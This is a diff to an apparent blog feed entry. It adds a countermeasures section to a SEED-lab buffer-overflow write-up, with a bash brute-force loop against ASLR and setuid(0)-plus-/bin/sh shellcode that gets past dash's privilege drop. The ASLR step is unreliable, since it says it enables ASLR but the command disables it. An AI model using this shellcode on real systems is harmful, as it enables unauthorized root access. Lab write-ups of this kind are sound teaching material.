@@ -144,7 +144,28 @@
 </ol>
 <center><img src="/Buffer_Overflow/ebp.png" class></center>
 <p>If you look back, you will find that <code>$ebp</code> in <code>gdb</code> mode is <code>0xbfffea18</code>. The distance is <code>64</code> between two values of <code>$ebp</code>. That’s why I have mentioned that <code>420</code> can be changed manually, but it may be better if the number is big enough.</p>
-]]></content>
+<h1>Countermeasures</h1>
+<p>In <strong>before attack</strong> part, I have shut down 4 countermeasures, 2 of which belongs to the operating system, while others belong to <code>gcc</code>. I will talk about some details.</p>
+<h3 id="ASLR">ASLR</h3>
+<p>Why we can succeed at once? Because the initial position of stack doesn’t change. If we turn on <code>ASLR</code>, the initial position of stack alters every time this program is executed.</p>
+<p>Input the following command to turn on <code>ASLR</code>.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
+<p>We need to write a shell script to run our program again and again.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">value=$((<span class="variable">$value</span> + 1))</span><br><span class="line">duration=<span class="variable">$SECONDS</span></span><br><span class="line">min=$((<span class="variable">$duration</span> / 60))</span><br><span class="line">sec=$((<span class="variable">$duration</span> % 60))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$min</span> minutes and <span class="variable">$sec</span> seconds elapsed."</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The program has been running <span class="variable">$value</span> times so far."</span></span><br><span class="line">./stack</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<center><img src="/Buffer_Overflow/9_times.png" class></center>
+<p>After 9 minutes’ attack, we finally succeed.</p>
+<p>Why can we succeed? Because the initial position floats in a small range(about plus-minus 200). Remember <code>nop</code> I talk about before? It shows their function here.</p>
+<h3 id="Dash">Dash</h3>
+<p><code>dash</code> will check whether the <code>uid</code> is the same with <code>euid</code>. If not, it will deprive your <code>root</code> permission.</p>
+<p>If we can add some instructions like <code>setuid(0)</code> before <code>execve</code> , we can easily defeat dash.</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\x31\xc0"</span> <span class="comment">/* Line 1: xorl %eax,%eax */</span></span><br><span class="line"><span class="string">"\x31\xdb"</span> <span class="comment">/* Line 2: xorl %ebx,%ebx */</span></span><br><span class="line"><span class="string">"\xb0\xd5"</span> <span class="comment">/* Line 3: movb $0xd5,%al */</span>  </span><br><span class="line"><span class="string">"\xcd\x80"</span> <span class="comment">/* Line 4: int $0x80 */</span></span><br><span class="line"><span class="comment">// ---- The code below is the same as the one in Task 2 ---</span></span><br><span class="line"><span class="string">"\x31\xc0"</span></span><br><span class="line"><span class="string">"\x50"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"//sh"</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/bin"</span></span><br><span class="line"><span class="string">"\x89\xe3"</span></span><br><span class="line"><span class="string">"\x50"</span></span><br><span class="line"><span class="string">"\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1"</span></span><br><span class="line"><span class="string">"\x99"</span></span><br><span class="line"><span class="string">"\xb0\x0b"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br></pre></td></tr></table></figure>
+<p><code>setuid</code> is a system call whose system call number is <code>0xd5</code>. If we shutdown ASLR, we can easily get the result.</p>
+<center><img src="/Buffer_Overflow/dash.png" class></center>
+<h3 id="Non-execstack-and-stack-guard">Non-execstack and stack guard</h3>
+<p>In this experiment,I didn’t find any solution to these two countermeasures. The results are below.</p>
+<center><img src="/Buffer_Overflow/stack_noexec.png" class></center>
+<br>
+<center><img src="/Buffer_Overflow/stack_with_guard.png" class></center>]]></content>
       <categories>
         <category>seed-lab</category>
       </categories>
@@ -152,6 +173,7 @@
         <tag>linux</tag>
         <tag>seed-lab</tag>
         <tag>gdb</tag>
+        <tag>buffer-overflow</tag>
       </tags>
   </entry>
   <entry>
